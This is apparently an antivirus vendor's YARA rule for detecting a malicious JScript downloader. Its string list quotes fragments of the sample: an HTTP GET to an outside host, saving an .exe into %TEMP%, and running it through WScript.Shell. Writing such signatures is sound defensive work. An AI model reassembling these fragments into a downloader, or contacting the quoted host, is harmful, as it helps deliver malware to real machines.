rule sig_20160328_e396e17002935c580569c9883531e707 {
  meta:
    description = "datamaliciousorder - file 20160328_e396e17002935c580569c9883531e707.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d4bb6a5eb5f0b5b58f20aaef3ef69760c83e9b9abf8c09df6850c6d38f6a8a09"

  strings:
    $s1  = "function Goekymqq() {return Rqwaez[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"oxiDkARQUQR7.exe\";};" fullword ascii
    $s2  = "Shwuxhqxt[Dsoygzysbs](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Taraikq](Fverr() * 11)} while (Shwuxhqxt[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Xrbzzwu(Hbtjkhdcdf, Zekasmz){return Hbtjkhdcdf - Zekasmz;};" fullword ascii
    $s5  = "var Rqwaez = function Ransn() {return WScript[Mtseftthfv](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Rwlkc() {return ((Adcbpc == true) && (Adcbpc == Gviddurprx)) ? 1 : Ubodxryyya;};" fullword ascii
    $s7  = "function Dxomwgkz(Gctyqyret){Rqwaez[\"Run\"](Gctyqyret, Ubodxryyya, Ubodxryyya);};" fullword ascii
    $s8  = "Gviddurprx = true; " fullword ascii
    $s9  = "var Safdyxx = new this[\"Date\"]();" fullword ascii
    $s10 = "var Xemtqc = false;" fullword ascii
    $s11 = "function Majuj(Vpnsuhdoc) {var Sxelkpw = (1, 2, 3, 4, 5, Vpnsuhdoc); return Sxelkpw;};" fullword ascii
    $s12 = " while (Thnlfj){" fullword ascii
    $s13 = "function Svzehozl(){return Qlmjf;};" fullword ascii
    $s14 = "var Gviddurprx = false;" fullword ascii
    $s15 = "var Adcbpc = false;" fullword ascii
    $s16 = "return Xrbzzwu(Bqvleieals, Kkbserck);" fullword ascii
    $s17 = "function Fverr(){return 22;};" fullword ascii
    $s18 = "function Ogyzhgr()" fullword ascii
    $s19 = "function Ghfxpg(){return Mtseftthfv;};" fullword ascii
    $s20 = "Adcbpc = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}